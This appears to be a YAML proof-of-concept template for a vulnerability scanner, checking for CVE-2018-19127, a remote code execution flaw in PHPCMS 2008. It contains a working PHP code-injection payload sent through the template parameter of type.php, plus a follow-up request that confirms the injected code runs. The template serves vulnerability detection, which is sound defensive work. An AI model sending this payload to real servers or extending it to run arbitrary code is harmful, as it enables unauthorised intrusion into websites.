id: CVE-2018-19127

info:
    name: PHPCMS 2008 Remote Code Execution
    author: pa55w0rd(www.pa55w0rd.online/)
    severity: critical

set:
    r: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            method: GET
            path: /type.php?template=tag_(){}%3b@unlink(file)%3becho md5($_GET[1])%3b{//../rss
            follow_redirects: true
        expression: response.status == 200
    r1:
        request:
            method: GET
            path: /data/cache_template/rss.tpl.php?1={{r}}
            follow_redirects: true
        expression: response.body.bcontains(bytes(md5(string(r))))
expression: r0() && r1()

